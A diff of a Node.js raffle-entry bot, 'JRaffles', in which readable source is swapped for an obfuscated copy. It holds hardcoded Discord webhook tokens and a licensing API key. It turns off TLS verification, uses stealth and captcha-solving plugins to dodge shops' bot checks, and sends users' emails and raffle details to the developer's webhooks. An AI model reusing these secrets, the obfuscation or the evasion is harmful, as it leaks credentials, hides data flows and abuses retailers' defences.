@@ -1,6311 +1,3586 @@
-
-// 
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
-
-const fs = require("fs");
-const time = `${new Date().toDateString()} ${new Date().getHours()} ${new Date().getMinutes()} ${new Date().getSeconds()}`
-function redirectConsoleToFile(filename) {
-    const stream = fs.createWriteStream(filename, { flags: 'a' });
-    const oldLog = console.log;
-    // const cipher = crypto.createCipher('aes-256-cbc', encryptionKey);
-
-    console.log = function () {
-        const args = Array.prototype.slice.call(arguments);
-        const logString = args.join(' ') + '\n';
-        // const encryptedData = cipher.update(logString, 'utf8', 'hex');
-        stream.write(logString);
-        oldLog.apply(console, args);
+process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
+const _0x65e0bc = require('fs'), _0x399e7a = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
+function _0x223360(_0x4c4271) {
+    const _0x2fd028 = _0x65e0bc['createWriteStream'](_0x4c4271, { 'flags': 'a' }), _0x1ebcdd = console['log'];
+    console['log'] = function () {
+        const _0x35f3da = Array['prototype']['slice']['call'](arguments), _0x4b51b7 = _0x35f3da['join']('\x20') + '\x0a';
+        _0x2fd028['write'](_0x4b51b7), _0x1ebcdd['apply'](console, _0x35f3da);
     };
 }
-
-redirectConsoleToFile(`../logs/log ${time}`);
-
-var jar = require("tough-cookie");
-var Imap = require('node-imap'),
-    inspect = require('util').inspect;
-const simpleParser = require('mailparser').simpleParser;
-const { EmbedBuilder } = require('discord.js');
-var exeCute = require('exe');
-const { execFile } = require('child_process');
-const puppeteer = require("puppeteer-extra");
-const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
-const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-const chalk = require('chalk');
-const setTitle = require('node-bash-title');
-const axios = require('axios');
-const Papa = require('papaparse');
-var random = require('random-name');
-const request = require("request");
-var prompt = require("prompt");
-const j = request.jar();
-var settings = {};
-const succesWebH = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj';
-const errorWebH = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy';
-const openWebH = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6';
-const accountWebH = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE';
-const publicWebH = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn';
-const verWebH = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
-var webhook = 'https://discord.com/api/webhooks/';
-var openWH = `${webhook}${openWebH}`
-var accountWH = `${webhook}${accountWebH}`
-var succesWH = `${webhook}${succesWebH}`;
-var errorWH = `${webhook}${errorWebH}`;
-var publicWH = `${webhook}${publicWebH}`;
-var verWH = `${webhook}${verWebH}`;
-
-
-
-
-const package = JSON.parse(fs.readFileSync("../package.json", "utf-8"));
-const version = package.version;
-
-var currentFile;
-var currentProxy;
-var taskCSV;
-var taskFiles;
-var proxyFiles;
-var licenseKey;
-var username;
-var avatar;
-const API_KEY = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe'
-let auth = false;
-const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-const numbers = "0123456789"
-var lettersArray = letters.split('');
-
-const AutoGitUpdate = require('auto-git-update');
-
-
-const config = {
-    repository: 'https://github.com/Jarno97/JRafflesBot',
-    branch: 'main',
-    fromReleases: false,
-    tempLocation: 'C:/temp/jraffles',
-    ignoreFiles: ['settings.json',
-        'proxies.txt', 'tasks/maha.csv', 'tasks/footshop.csv', 'tasks/afew.csv', 'tasks/oqium.csv', 'tasks/patta.csv', 'accounts/patta.csv', 'tasks/kickz.csv', 'accounts/kickz-verified.csv', 'accounts/kickz-unverified.csv']
+_0x223360('../logs/log\x20' + _0x399e7a);
+var _0x2b0e83 = require('tough-cookie'), _0x3e4e8d = require('node-imap'), _0x16170f = require('util')['inspect'];
+const _0x300bc8 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x3de3a3 } = require('discord.js');
+var _0x5ddab8 = require('exe');
+const { execFile: _0x4ce369 } = require('child_process'), _0x5d136d = require('puppeteer-extra'), _0xe5ec8f = require('puppeteer-extra-plugin-recaptcha'), _0x2ce6bf = require('puppeteer-extra-plugin-stealth'), _0x1403a4 = require('chalk'), _0x244762 = require('node-bash-title'), _0x5d1b21 = require('axios'), _0x3e0e2d = require('papaparse');
+var _0x31b037 = require('random-name');
+const _0x225fcc = require('request');
+var _0xab4dc6 = require('prompt');
+const _0x103baf = _0x225fcc['jar']();
+var _0x51d52a = {};
+const _0x48399b = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x1d9568 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x3b02ce = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3d649b = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x1922fd = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x473483 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
+var _0x2d7c08 = 'https://discord.com/api/webhooks/', _0x58a2d0 = '' + _0x2d7c08 + _0x3b02ce, _0x431ce7 = '' + _0x2d7c08 + _0x3d649b, _0x5317eb = '' + _0x2d7c08 + _0x48399b, _0x802c1e = '' + _0x2d7c08 + _0x1d9568, _0x55a106 = '' + _0x2d7c08 + _0x1922fd, _0x7cc4fb = '' + _0x2d7c08 + _0x473483;
+const _0x164a06 = JSON['parse'](_0x65e0bc['readFileSync']('../package.json', 'utf-8')), _0x3b2d4c = _0x164a06['version'];
+var _0x214f6f, _0x1d31f7, _0x4df38a, _0x53258f, _0x5a13e6, _0x459e4e, _0x358285, _0x4f1e3f;
+const _0x5b2b6c = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
+let _0x471b05 = ![];
+const _0x58ad1a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x4aa7f2 = '0123456789';
+var _0x492fe9 = _0x58ad1a['split']('');
+const _0x4096f3 = require('auto-git-update'), _0x4b457b = {
+    'repository': 'https://github.com/Jarno97/JRafflesBot',
+    'branch': 'main',
+    'fromReleases': ![],
+    'tempLocation': 'C:/temp/jraffles',
+    'ignoreFiles': [
+        'settings.json',
+        'proxies.txt',
+        'tasks/maha.csv',
+        'tasks/footshop.csv',
+        'tasks/afew.csv',
+        'tasks/oqium.csv',
+        'tasks/patta.csv',
+        'accounts/patta.csv',
+        'tasks/kickz.csv',
+        'accounts/kickz-verified.csv',
+        'accounts/kickz-unverified.csv'
+    ]
+}, _0x141a06 = new _0x4096f3(_0x4b457b);
+async function _0x2b1268() {
+    _0x5a13e6 = _0x65e0bc['readdirSync']('../proxies'), _0x53258f = _0x65e0bc['readdirSync']('../tasks'), !_0x65e0bc['existsSync']('../accounts/fenom.csv') && _0x65e0bc['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x65e0bc['existsSync']('../accounts/paypal.csv') && _0x65e0bc['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x65e0bc['existsSync']('../accounts/bstn.csv') && _0x65e0bc['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x65e0bc['existsSync']('../accounts/eql.csv') && _0x65e0bc['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x65e0bc['existsSync']('../failed-tasks.csv') && _0x65e0bc['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x65e0bc['existsSync']('../successful-tasks.csv') && _0x65e0bc['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x51d52a = JSON['parse'](_0x65e0bc['readFileSync']('../settings.json', 'utf-8')), !_0x51d52a['delay'] && (_0x51d52a['delay'] = 0x3c, _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['threads'] && (_0x51d52a['threads'] = 0x1, _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['masterMail'] && (_0x51d52a['masterMail'] = 'yourmail@gmail.com', _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['masterPassword'] && (_0x51d52a['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['captchaKey'] && (_0x51d52a['captchaKey'] = '', _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['useRandomProxy'] && (_0x51d52a['useRandomProxy'] = !![], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['shuffleTasks'] && (_0x51d52a['shuffleTasks'] = ![], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), !_0x51d52a['webhook'] && (_0x51d52a['webhook'] = '', _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), _0x51d52a['delay'] <= 0x1388 && (_0x51d52a['delay'] = _0x51d52a['delay'] * 0x3e8), _0x51d52a['AfewDelay'] && (delete _0x51d52a['AfewDelay'], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), _0x51d52a['MahaDelay'] && (delete _0x51d52a['MahaDelay'], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), _0x51d52a['footshopDelay'] && (delete _0x51d52a['footshopDelay'], _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a, null, 0x2))), _0x51d52a['MahaDelay'] = _0x51d52a['delay'], _0x2d7c08 = _0x51d52a['webhook'], _0x459e4e = _0x51d52a['licenseKey'];
 }
-
-const updater = new AutoGitUpdate(config);
-
-async function loadSettings() {
-    // const afewCSV = fs.readFileSync('../tasks/afew.csv', 'utf8');
-    // afew = Papa.parse(afewCSV, { header: true }).data;
-    // const mahaCSV = fs.readFileSync('../tasks/maha.csv', 'utf-8');
-    // maha = Papa.parse(mahaCSV, { header: true }).data;
-    // const footshopCSV = fs.readFileSync('../tasks/footshop.csv', 'utf-8');
-    // footshop = Papa.parse(footshopCSV, { header: true }).data;
-    // const bstnCSV = fs.readFileSync('../tasks/bstn.csv', 'utf-8');
-    // bstn = Papa.parse(bstnCSV, { header: true }).data;
-    // const kickzCSV = fs.readFileSync('../tasks/kickz.csv', 'utf-8');
-    // kickz = Papa.parse(kickzCSV, { header: true }).data;
-    // const oqiumCSV = fs.readFileSync('../tasks/oqium.csv', 'utf-8');
-    // oqium = Papa.parse(oqiumCSV, { header: true }).data;
-    // const bouncewearCSV = fs.readFileSync('../tasks/bouncewear.csv', 'utf-8');
-    // bouncewear = Papa.parse(bouncewearCSV, { header: true }).data;
-    // const pattaCSV = fs.readFileSync('../tasks/patta.csv', 'utf-8');
-    // patta = Papa.parse(pattaCSV, { header: true }).data;
-
-    proxyFiles = fs.readdirSync('../proxies');
-    taskFiles = fs.readdirSync('../tasks');
-    if (!fs.existsSync('../accounts/fenom.csv')) {
-        fs.writeFileSync('../accounts/fenom.csv', 'Email,Password\n');
-    }
-    if (!fs.existsSync('../accounts/paypal.csv')) {
-        fs.writeFileSync('../accounts/paypal.csv', 'Email,Password,Proxy\n');
-    }
-    if (!fs.existsSync('../accounts/bstn.csv')) {
-        fs.writeFileSync('../accounts/bstn.csv', 'Email,Password\n');
-    }
-    if (!fs.existsSync('../accounts/eql.csv')) {
-        fs.writeFileSync('../accounts/eql.csv', 'Email,Password,Phone\n');
-    }
-    if (!fs.existsSync('../failed-tasks.csv')) {
-        fs.writeFileSync('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\n')
-    }
-    if (!fs.existsSync('../successful-tasks.csv')) {
-        fs.writeFileSync('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\n')
-    }
-    settings = JSON.parse(fs.readFileSync("../settings.json", "utf-8"));
-    if (!settings.delay) {
-        settings.delay = 60;
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-
-    }
-    if (!settings.threads) {
-        settings.threads = 1;
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-
-    }
-    if (!settings.masterMail) {
-        settings.masterMail = 'yourmail@gmail.com';
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-
-    }
-    if (!settings.masterPassword) {
-        settings.masterPassword = 'read the guide on how to get an APP PASSWORD';
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-
-    }
-    if (!settings.captchaKey) {
-        settings.captchaKey = '';
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-
-    }
-    if (!settings.useRandomProxy) {
-        settings.useRandomProxy = true;
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-    }
-    if (!settings.shuffleTasks) {
-        settings.shuffleTasks = false;
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-    }
-    if (!settings.webhook) {
-        settings.webhook = '';
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-
-    }
-    if (settings.delay <= 5000) {
-        settings.delay = settings.delay * 1000;
-
-    }
-    if (settings.AfewDelay) {
-        delete settings.AfewDelay;
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-
-    }
-    if (settings.MahaDelay) {
-        delete settings.MahaDelay;
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-
-    }
-    if (settings.footshopDelay) {
-        delete settings.footshopDelay;
-        fs.writeFileSync("../settings.json", JSON.stringify(settings, null, 2));
-
-    }
-    settings.MahaDelay = settings.delay
-    webhook = settings.webhook
-    licenseKey = settings.licenseKey
-
+let _0x45528b, _0x30ecdd = [], _0x2a3341;
+const _0x116d4a = _0x15f2a4 => new Promise(_0x23dce5 => setTimeout(_0x23dce5, _0x15f2a4));
+function _0x1053b1(_0x337182, _0x3223ec) {
+    return Math['floor'](Math['random']() * (_0x3223ec - _0x337182 + 0x1) + _0x337182);
 }
-
-let testValues;
-
-let afewProducts = [];
-
-
-
-let afewProduct;
-const delay = time => new Promise(res => setTimeout(res, time));
-
-function randomIntFromInterval(min, max) { // min and max included 
-    return Math.floor(Math.random() * (max - min + 1) + min)
+function _0x2cf6dd(_0x3acb32) {
+    let _0x43bd28 = _0x3acb32['length'], _0x7eb940;
+    while (_0x43bd28 != 0x0) {
+        _0x7eb940 = Math['floor'](Math['random']() * _0x43bd28), _0x43bd28--, [_0x3acb32[_0x43bd28], _0x3acb32[_0x7eb940]] = [
+            _0x3acb32[_0x7eb940],
+            _0x3acb32[_0x43bd28]
+        ];
+    }
+    return _0x3acb32;
 }
-
-function shuffle(array) {
-    let currentIndex = array.length, randomIndex;
-
-    // While there remain elements to shuffle.
-    while (currentIndex != 0) {
-
-        // Pick a remaining element.
-        randomIndex = Math.floor(Math.random() * currentIndex);
-        currentIndex--;
-
-        // And swap it with the current element.
-        [array[currentIndex], array[randomIndex]] = [
-            array[randomIndex], array[currentIndex]];
-    }
-
-    return array;
+async function _0x38b12c(_0x2096d0) {
+    return _0x5d1b21['get']('https://api.hyper.co/v4/licenses/' + _0x2096d0, { 'headers': { 'Authorization': 'Bearer\x20' + _0x5b2b6c } })['then'](_0x4b7b51 => _0x4b7b51['data'])['catch'](() => null);
 }
-
-async function getLicense(license) {
-    return axios.get(`https://api.hyper.co/v4/licenses/${license}`,
-        { headers: { Authorization: `Bearer ${API_KEY}` } })
-        .then((response) => response.data)
-        .catch(() => null);
-};
-
-async function checkLicense(license) {
-    console.clear();
-    if (license == 'AWGH-0N92-JE6S-HOHU') {
-        console.log('Please paste your key here:');
-        var licensePrompt = await prompt.get('License');
-        if (licensePrompt.License == 'AWGH-0N92-JE6S-HOHU') {
-            console.log('Error please use the key on the JRaffles dashboard');
-            await delay(3000)
-            return checkLicense(license);
-        }
-        license = licensePrompt.License;
-        settings.licenseKey = license;
-        licenseKey = license;
-        fs.writeFileSync("../settings.json", JSON.stringify(settings));
-
+;
+async function _0x22cdfb(_0xde2cce) {
+    console['clear']();
+    if (_0xde2cce == 'AWGH-0N92-JE6S-HOHU') {
+        console['log']('Please\x20paste\x20your\x20key\x20here:');
+        var _0x2037c7 = await _0xab4dc6['get']('License');
+        if (_0x2037c7['License'] == 'AWGH-0N92-JE6S-HOHU')
+            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x116d4a(0xbb8), _0x22cdfb(_0xde2cce);
+        _0xde2cce = _0x2037c7['License'], _0x51d52a['licenseKey'] = _0xde2cce, _0x459e4e = _0xde2cce, _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a));
     }
-    console.log(`Checking license ${licenseKey}...`);
-    await delay(800);
-    const licenseData = await getLicense(license);
-    username = JSON.stringify(licenseData.user.discord.username).substring(1).slice(0, -1);
-    avatar = JSON.stringify(licenseData.user.discord.avatar).substring(1).slice(0, -1);
-    // console.log(licenseData);
-    // await delay(400000)
-    if (!licenseData) return console.log('License not found');
-
-    if (!licenseData.user) return console.log('License not bound')
-
-    if (licenseData.status === 'active') {
-        console.log('License is good to go!');
-        return auth = true;
-    } else {
-        console.log('Could not find license..');
-        return auth = false;
-    }
-
+    console['log']('Checking\x20license\x20' + _0x459e4e + '...'), await _0x116d4a(0x320);
+    const _0x333169 = await _0x38b12c(_0xde2cce);
+    _0x358285 = JSON['stringify'](_0x333169['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x4f1e3f = JSON['stringify'](_0x333169['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
+    if (!_0x333169)
+        return console['log']('License\x20not\x20found');
+    if (!_0x333169['user'])
+        return console['log']('License\x20not\x20bound');
+    return _0x333169['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x471b05 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x471b05 = ![]);
 }
-
-async function getModule() {
-    var taskModule = await prompt.get('Module');
-    console.clear();
-    return taskModule.Module;
-};
-
-async function getSetting() {
-    var Setting = await prompt.get('Setting');
-    console.clear();
-    return Setting.Setting;
+async function _0x48764d() {
+    var _0x5d8a6f = await _0xab4dc6['get']('Module');
+    return console['clear'](), _0x5d8a6f['Module'];
 }
-
-async function getTaskFile(currentFunction) {
-    var sortedFiles = []
-    for (file of taskFiles) {
-        var ts = fs.readFileSync(`../tasks/${file}`, 'utf-8');
-        tsParse = Papa.parse(ts, { header: true }).data;
-        if (tsParse[0].Store == currentFunction.store) {
-            sortedFiles.push(file);
-        }
-    }
-    // console.log(sortedFiles);
-    if (!sortedFiles.length == 0) {
-        taskFiles = sortedFiles;
-    }
-    // console.clear();
-    console.log(`Choose A File to Run \n`)
-    for (var t = 0; t < taskFiles.length; t++) {
-        console.log(` (${t}) ${taskFiles[t]}`)
-    }
-    console.log('')
-    var taskFile = await prompt.get('Task');
-    if (taskFile.Task > taskFiles.length - 1 || isNaN(taskFile.Task) == true) {
-        console.log('Invalid selection');
-        await delay(1000);
-        return getTaskFile();
-    }
-    var task = fs.readFileSync(`../tasks/${taskFiles[taskFile.Task]}`, 'utf-8');
-    taskCSV = Papa.parse(task, { header: true }).data;
-    console.clear();
-    console.log(`Running ${chalk.blue(taskFiles[taskFile.Task])}`);
-    currentFile = taskFiles[taskFile.Task]
-    return taskCSV
+;
+async function _0x5dd5e8() {
+    var _0x3d0e95 = await _0xab4dc6['get']('Setting');
+    return console['clear'](), _0x3d0e95['Setting'];
 }
-
-async function getProxyFile() {
-    console.clear();
-    console.log(`Choose Proxies to Use \n`)
-    for (var t = 0; t < proxyFiles.length; t++) {
-        console.log(` (${t}) ${proxyFiles[t]}`)
+async function _0xb9dc1e(_0x2ee21e) {
+    var _0x3aa962 = [];
+    for (file of _0x53258f) {
+        var _0x5c4a7b = _0x65e0bc['readFileSync']('../tasks/' + file, 'utf-8');
+        tsParse = _0x3e0e2d['parse'](_0x5c4a7b, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x2ee21e['store'] && _0x3aa962['push'](file);
     }
-    console.log('')
-    var proxyFile = await prompt.get('Proxies');
-    if (proxyFile.Proxies > proxyFiles.length - 1 || isNaN(proxyFile.Proxies) == true) {
-        console.log('Invalid selection');
-        await delay(1000);
-        return getProxyFile();
+    !_0x3aa962['length'] == 0x0 && (_0x53258f = _0x3aa962);
+    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
+    for (var _0x3dad35 = 0x0; _0x3dad35 < _0x53258f['length']; _0x3dad35++) {
+        console['log']('\x20(' + _0x3dad35 + ')\x20' + _0x53258f[_0x3dad35]);
     }
-    var proxys = fs.readFileSync(`../proxies/${proxyFiles[proxyFile.Proxies]}`, 'utf-8').split('\n');
-    let proxy = proxys.map((proxy, index) => {
-        sanatizeProxy = proxy.replace("\r", "");
-        if (proxys[index + 1] != undefined) {
-            return `${sanatizeProxy}`;
-        }
-        return `${sanatizeProxy}`;
+    console['log']('');
+    var _0x40e06a = await _0xab4dc6['get']('Task');
+    if (_0x40e06a['Task'] > _0x53258f['length'] - 0x1 || isNaN(_0x40e06a['Task']) == !![])
+        return console['log']('Invalid\x20selection'), await _0x116d4a(0x3e8), _0xb9dc1e();
+    var _0x5a0e92 = _0x65e0bc['readFileSync']('../tasks/' + _0x53258f[_0x40e06a['Task']], 'utf-8');
+    return _0x4df38a = _0x3e0e2d['parse'](_0x5a0e92, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1403a4['blue'](_0x53258f[_0x40e06a['Task']])), _0x214f6f = _0x53258f[_0x40e06a['Task']], _0x4df38a;
+}
+async function _0x1083d0() {
+    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
+    for (var _0x39ceb9 = 0x0; _0x39ceb9 < _0x5a13e6['length']; _0x39ceb9++) {
+        console['log']('\x20(' + _0x39ceb9 + ')\x20' + _0x5a13e6[_0x39ceb9]);
+    }
+    console['log']('');
+    var _0x4c3508 = await _0xab4dc6['get']('Proxies');
+    if (_0x4c3508['Proxies'] > _0x5a13e6['length'] - 0x1 || isNaN(_0x4c3508['Proxies']) == !![])
+        return console['log']('Invalid\x20selection'), await _0x116d4a(0x3e8), _0x1083d0();
+    var _0x4611d5 = _0x65e0bc['readFileSync']('../proxies/' + _0x5a13e6[_0x4c3508['Proxies']], 'utf-8')['split']('\x0a');
+    let _0x5d4e0a = _0x4611d5['map']((_0x5772dd, _0x3d0f1e) => {
+        sanatizeProxy = _0x5772dd['replace']('\x0d', '');
+        if (_0x4611d5[_0x3d0f1e + 0x1] != undefined)
+            return '' + sanatizeProxy;
+        return '' + sanatizeProxy;
     });
-    currentProxy = proxyFiles[proxyFile.Proxies];
-    console.clear();
-    return proxy;
+    return _0x1d31f7 = _0x5a13e6[_0x4c3508['Proxies']], console['clear'](), _0x5d4e0a;
 }
-
-async function getValue() {
-    var Value = await prompt.get('Value');
-    console.clear();
-    return Value.Value;
+async function _0x373407() {
+    var _0x34213c = await _0xab4dc6['get']('Value');
+    return console['clear'](), _0x34213c['Value'];
 }
-
-async function getFunction(modules) {
-    console.clear();
-    console.log('What would you like to do? \n');
-    for (var m = 0; m < modules.length; m++) {
-        console.log(` (${m}) [${modules[m].name}]`)
-    };
-    console.log('')
-    var Module = await prompt.get('Module');
-    return Module.Module
+async function _0x11d57e(_0x549d9b) {
+    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
+    for (var _0x421810 = 0x0; _0x421810 < _0x549d9b['length']; _0x421810++) {
+        console['log']('\x20(' + _0x421810 + ')\x20[' + _0x549d9b[_0x421810]['name'] + ']');
+    }
+    ;
+    console['log']('');
+    var _0x22ff86 = await _0xab4dc6['get']('Module');
+    return _0x22ff86['Module'];
 }
-
-async function getPassword() {
-    var pw = await prompt.get('Password');
-    console.clear();
-    return pw.Password;
-};
-
-async function getLinks() {
-    var agLinks = await prompt.get('Links');
-    return agLinks.Links;
-};
-
-async function getAfewProduct() {
-    console.log(`Choose a Raffle to enter: \n`);
-    for (var p = 0; p < afewProducts.length; p++) {
-        console.log(` (${p}) ${afewProducts[p]}`)
-    };
-    console.log();
-    let AP = await prompt.get('Product');
-    console.clear();
-    return AP.Product;
-};
-
-function getTime() {
-    var time = new Date(Date.now()).toLocaleTimeString();
-    return time;
-};
-
-function getDay() {
-    var day = new Date(Date.now()).toLocaleString();
-    return day.replace(',', '')
+async function _0x3234cc() {
+    var _0x4f11b7 = await _0xab4dc6['get']('Password');
+    return console['clear'](), _0x4f11b7['Password'];
 }
-
-
-
-async function sendWebhook(url, content) {
-    let config = {
-        headers: {
-            'content-type': 'application/json',
-        }
-    }
-    if (version != 'devkey') {
-        await axios.post(url, content, config);
-        return
-    }
-    return console.log('devkey settings enabled, not sending webhooks');
-};
-
-async function makeEmbed(csv, module, mode, isError, e) {
-    if (!isError && mode == 'dev') {
-        var embed = new EmbedBuilder()
-            .setColor(0xc0d6d6)
-            .setTitle('Successful Raffle Entry')
-            .setAuthor({ name: 'JRaffles', iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg', url: 'https://twitter.com/JRaffles_' })
-            .setThumbnail(module.logo)
-            .addFields({ name: 'Store', value: `${module.store}`, inline: true })
-            .addFields({ name: 'Size', value: `${csv.Size}`, inline: true })
-            .addFields({ name: 'Delay', value: `${settings.delay}`, inline: true })
-            .addFields({ name: 'User', value: `${username}`, inline: true })
-            .addFields({ name: 'URL', value: `${csv.Url}`, inline: true })
-            .addFields({ name: 'Mail', value: `${csv.Email}`, inline: true })
-            .setTimestamp()
-            .setFooter({ text: `JRaffles v${version}`, iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg' });
-        return embed.data
-    } else if (isError && mode == 'dev') {
-        var embed = new EmbedBuilder()
-            .setColor(0xc0d6d6)
-            .setTitle('Failed Raffle Entry')
-            .setAuthor({ name: 'JRaffles', iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg', url: 'https://twitter.com/JRaffles_' })
-            .setThumbnail(module.logo)
-            .addFields(
-                { name: 'User', value: `${username}`, inline: true },
-                { name: 'Store', value: `${module.store}`, inline: true },
-                { name: 'Size', value: `${csv.Size}`, inline: true },
-                { name: 'Delay', value: `${settings.delay}`, inline: true }
-            )
-            .addFields({ name: 'ERROR', value: `${e}`, inline: true })
-            .addFields({ name: 'URL', value: `${csv.Url}` })
-            .addFields({ name: 'Mail', value: `${csv.Email}`, inline: true })
-
-            .setTimestamp()
-            .setFooter({ text: `JRaffles v${version}`, iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg' });
-        return embed.data
-    } else if (mode == 'pub') {
-        var embed = new EmbedBuilder()
-            .setColor(0xc0d6d6)
-            .setTitle('Succesful Raffle Entry')
